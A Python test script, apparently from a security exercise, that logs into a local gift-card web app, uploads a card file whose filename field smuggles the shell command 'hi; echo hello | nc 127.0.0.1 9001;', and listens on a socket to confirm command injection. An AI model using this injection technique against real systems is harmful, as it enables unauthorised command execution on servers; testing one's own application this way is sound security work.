import re
import requests
import socket

url = "http://127.0.0.1/login.html"
url2 = "http://127.0.0.1/useCard.html"

data = {
    'uname':'attacker',
    'pword':'attacker'
}

files = {
    'card_data':('ank8821-cmdi.gftcrd',open('ank8821-cmdi.gftcrd','rb'),'application/octet-stream'),
    'card_supplied':(None,True),
    'card_fname':(None,'hi; echo hello | nc 127.0.0.1 9001;')
}

with requests.Session() as session:

    # Getting the initial csrftoken
    get_token = session.get(url).headers
    csrf = re.search('csrftoken=\w*',get_token['Set-Cookie']).group(0).split('=')
    print("Performing Login")

    # Loggin in using the obtained token
    data['csrfmiddlewaretoken']=csrf[1]
    r = session.post(url,data=data,allow_redirects=False).headers

    # Grabbing the new csrf token and session id
    new_csrf = re.search('csrftoken=\w*',r['Set-Cookie']).group(0).split('=')
    sessid = re.search('sessionid=\w*',r['Set-Cookie']).group(0).split('=')
    cookie = {sessid[0]:sessid[1]}
    files['csrfmiddlewaretoken'] = (None,new_csrf[1])
    print("Checking for CMD Injection")
    
    # Setting up the socket listener
    pyListener = socket.socket()
    pyListener.settimeout(5)
    pyListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    pyListener.bind(('127.0.0.1', 9001))
    pyListener.listen()

    # Sending payload after logging in and checking for CMDi
    try:
        req = session.post(url2,cookies=cookie,files=files,timeout=1)
    except:
        pass
    try:
        connection, address = pyListener.accept()
        print("Received connection from {}".format(address))
        output = connection.recv(1024).decode()
    except:
        pass
    pyListener.close()
    if 'output' in locals():
        print("NC output = {}".format(output))
        print("\nVulnerable to CMDi!")
    else:
        print("Socket timed out. No connection received.")
        print('\nNot Vulnerable to CMDi!')